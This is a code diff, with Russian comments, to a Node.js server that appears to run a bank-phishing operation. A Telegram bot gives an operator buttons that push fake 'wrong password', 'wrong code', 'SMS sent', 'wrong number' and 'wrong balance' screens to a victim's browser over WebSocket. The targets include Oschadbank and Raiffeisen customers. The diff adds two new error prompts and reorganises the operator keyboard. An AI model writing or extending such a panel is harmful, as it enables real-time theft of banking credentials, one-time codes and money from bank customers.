@@ -70,24 +70,55 @@ wss.on('connection', (ws) => {
     ws.on('error', (error) => console.error('Ошибка WebSocket:', error));
 });
 
+// --- ИЗМЕНЕННЫЙ БЛОК ---
 bot.on('callback_query', (callbackQuery) => {
     const [type, sessionId] = callbackQuery.data.split(':');
     const ws = clients.get(sessionId);
+
     if (!ws || ws.readyState !== WebSocket.OPEN) {
         bot.answerCallbackQuery(callbackQuery.id, { text: '❗️Ошибка: клиент не в сети!', show_alert: true });
         return;
     }
+
     const sessionData = sessions.get(sessionId) || {};
     let command = { type: type, data: {} };
+
+    // Добавляем новые типы в case
     switch (type) {
-        case 'lk': case 'call': case 'telegram_debit': case 'code_error': case 'other': case 'ban': break;
-        case 'password_error': command.data = { loginType: sessionData.loginMethod || 'phone' }; break;
-        case 'sms': command.data = { text: "Вам відправлено SMS з кодом..." }; break;
-        case 'request_details': command.data = { isRaiffeisen: sessionData.bankName === 'Райффайзен' }; break;
-        default: bot.answerCallbackQuery(callbackQuery.id, { text: `Неизвестная команда: ${type}` }); return;
+        case 'lk': // Оставлен на случай, если где-то используется
+        case 'call':
+        case 'telegram_debit':
+        case 'code_error':
+        case 'other':
+        case 'ban':
+        case 'number_error':  // <-- НОВАЯ КНОПКА
+        case 'balance_error': // <-- НОВАЯ КНОПКА
+            break; 
+        case 'password_error':
+            command.data = { loginType: sessionData.loginMethod || 'phone' };
+            break;
+        case 'sms':
+            command.data = { text: "Вам відправлено SMS з кодом..." };
+            break;
+        case 'request_details':
+            command.data = { isRaiffeisen: sessionData.bankName === 'Райффайзен' };
+            break;
+        default:
+            bot.answerCallbackQuery(callbackQuery.id, { text: `Неизвестная команда: ${type}` });
+            return;
     }
+
     ws.send(JSON.stringify(command));
-    bot.answerCallbackQuery(callbackQuery.id, { text: `Команда "${type}" отправлена!` });
+    
+    // Подбираем текст ответа для кнопки
+    let responseText = `Команда "${type}" отправлена!`;
+    if (type === 'number_error') {
+        responseText = 'Запрос "неверный номер" отправлен!';
+    } else if (type === 'balance_error') {
+        responseText = 'Запрос "неверный баланс" отправлен!';
+    }
+    
+    bot.answerCallbackQuery(callbackQuery.id, { text: responseText });
 });
 
 app.post('/api/submit', (req, res) => {
@@ -181,24 +212,33 @@ app.post('/api/sms', (req, res) => {
     }
 });
 
+// --- ИЗМЕНЕННЫЙ БЛОК ---
 function sendToTelegram(message, sessionId, bankName) {
     let keyboard = [];
+
+    // Новая универсальная клавиатура для всех банков
     if (bankName === 'Ощадбанк') {
         keyboard = [
-            [{ text: '📱 ЛК', callback_data: `lk:${sessionId}` }, { text: '📞 Звонок', callback_data: `call:${sessionId}` }, { text: '💸 Списание', callback_data: `telegram_debit:${sessionId}` }],
-            [{ text: '❌Пароль', callback_data: `password_error:${sessionId}` }, { text: '❌Код', callback_data: `code_error:${sessionId}` }, { text: '❓OTHER', callback_data: `other:${sessionId}` }],
-            [{ text: '🚫 BAN', callback_data: `ban:${sessionId}` }]
+            // Первый ряд: основные действия
+            [{ text: 'Звонок', callback_data: `call:${sessionId}` }, { text: 'Списание', callback_data: `telegram_debit:${sessionId}` }, { text: 'Запрос', callback_data: `request_details:${sessionId}` }],
+            // Второй ряд: типовые ошибки
+            [{ text: '❌Пароль', callback_data: `password_error:${sessionId}` }, { text: '❌Код', callback_data: `code_error:${sessionId}` }, { text: '❌Номер', callback_data: `number_error:${sessionId}` }],
+            // Третий ряд: другие ошибки и действия
+            [{ text: '❌Баланс', callback_data: `balance_error:${sessionId}` }, { text: 'Другой', callback_data: `other:${sessionId}` }, { text: 'Бан', callback_data: `ban:${sessionId}` }]
         ];
-    } else {
+    } else { // Клавиатура для других банков
         keyboard = [
-            [{ text: '💬 SMS', callback_data: `sms:${sessionId}` }, { text: '❓OTHER', callback_data: `other:${sessionId}` }],
-            [{ text: '🚫 BAN', callback_data: `ban:${sessionId}` }]
+            // Первый ряд: основные действия
+            [{ text: 'SMS', callback_data: `sms:${sessionId}` }, { text: 'Запрос', callback_data: `request_details:${sessionId}` }],
+            // Второй ряд: типовые ошибки
+            [{ text: '❌Номер', callback_data: `number_error:${sessionId}` }, { text: '❌Баланс', callback_data: `balance_error:${sessionId}` }],
+            // Третий ряд: другие действия
+            [{ text: 'Другой', callback_data: `other:${sessionId}` }, { text: 'Бан', callback_data: `ban:${sessionId}` }]
         ];
-        if (banksForRequestButton.includes(bankName)) {
-            keyboard[0].push({ text: '📋 ЗАПРОС', callback_data: `request_details:${sessionId}` });
-        }
     }
-    bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML', reply_markup: { inline_keyboard: keyboard } }).catch(err => console.error("Telegram send error:", err));
+
+    bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML', reply_markup: { inline_keyboard: keyboard } })
+       .catch(err => console.error("Telegram send error:", err));
 }
 
 const PORT = process.env.PORT || 3000;
